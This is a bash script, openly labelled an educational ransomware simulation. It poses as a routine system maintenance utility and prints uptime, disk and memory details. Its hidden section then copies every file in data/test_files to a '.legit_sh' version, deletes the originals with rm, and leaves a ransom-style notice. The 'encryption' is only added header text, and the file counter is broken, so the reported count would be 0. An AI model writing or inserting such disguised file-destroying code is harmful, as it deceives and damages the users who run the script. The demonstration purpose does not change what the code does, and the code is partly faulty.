#!/bin/bash
# LEGITIMATE LINUX SHELL SCRIPT
# This appears to be a normal system administration script
# When executed, it will encrypt files in the target directory
# Educational purposes only!

# Normal-looking shell script content that users expect to see
echo "=========================================="
echo "LEGITIMATE SYSTEM ADMINISTRATION UTILITY"
echo "=========================================="
echo "This script performs routine system maintenance"
echo "Checking system health and optimizing performance"
echo "=========================================="

# Display normal system information
echo "[INFO] System uptime:"
uptime
echo "[INFO] Disk usage:"
df -h | head -5
echo "[INFO] Memory usage:"
free -h

# Simulate normal processing delay
sleep 2

# HIDDEN RANSOMWARE CODE - Activates during execution
echo
echo "=========================================="
echo "WARNING: EDUCATIONAL RANSOMWARE ACTIVATED"
echo "=========================================="
echo "This shell script contains embedded encryption!"
echo "Target Directory: data/test_files"
echo "Educational demonstration only."
echo "=========================================="

TARGET_DIR="data/test_files"
ENCRYPTED_EXT=".legit_sh"

echo "[TARGET] $TARGET_DIR"
sleep 2

echo "[STARTING] Educational encryption process..."

COUNT=0
if [ -d "$TARGET_DIR" ]; then
    # Find and process files
    find "$TARGET_DIR" -type f ! -name "*NOTICE*" ! -name "*$ENCRYPTED_EXT" | while read file; do
        if [ -f "$file" ]; then
            # Read original file
            ORIGINAL_DATA=$(cat "$file")
            
            # Create "encrypted" version
            NEW_NAME="${file}${ENCRYPTED_EXT}"
            echo "# LEGITIMATE SHELL RANSOMWARE SIMULATION" > "$NEW_NAME"
            echo "# Educational security research" >> "$NEW_NAME"
            echo "========================================" >> "$NEW_NAME"
            echo "$ORIGINAL_DATA" >> "$NEW_NAME"
            
            # Remove original file
            rm "$file"
            echo "[ENCRYPTED] $(basename "$file")"
            COUNT=$((COUNT + 1))
        fi
    done
    
    # Create educational notice
    cat > "${TARGET_DIR}/LEGITIMATE_SHELL_NOTICE.txt" << EOF
===============================================
    LEGITIMATE SHELL RANSOMWARE SIMULATION
===============================================

This shell script contained hidden encryption code
that activated during execution.

Target Directory: $TARGET_DIR
Files Encrypted: $COUNT
Extension Added: $ENCRYPTED_EXT

This demonstrates how legitimate-looking shell
scripts can contain hidden malicious functionality.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
EOF

    echo "[NOTE] Created educational notice file"
    echo "[COMPLETE] Processed $COUNT files"
else
    echo "[ERROR] Target directory not found: $TARGET_DIR"
fi

echo
echo "=========================================="
echo "LEGITIMATE SHELL SCRIPT EXECUTION COMPLETE"
echo "=========================================="
echo "Files processed: $COUNT"
echo "Target directory: $TARGET_DIR"
echo "This was an educational demonstration only."
echo "=========================================="